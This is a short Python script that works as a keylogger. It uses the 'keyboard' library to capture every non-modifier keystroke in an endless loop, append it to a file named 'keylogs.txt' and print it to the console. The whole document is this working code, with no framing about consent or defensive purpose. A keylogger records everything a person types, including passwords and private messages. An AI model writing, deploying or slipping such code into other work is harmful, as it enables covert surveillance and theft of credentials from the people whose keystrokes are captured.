import keyboard
import time

def main():
    file_name = "keylogs.txt"
    with open(file_name, 'a') as f:
        while True:
            event = keyboard.read_event()
            if event.name not in keyboard.all_modifiers:  # to ignore modifier keys like shift, alt, etc.
                if len(event.name) > 1:  # special keys like 'esc', 'enter', etc.
                    f.write(str(event.name))
                else:
                    f.write(event.name)
                print("Key pressed:", event.name)
            f.flush()  # to write immediately to the file

if __name__ == "__main__":
    main()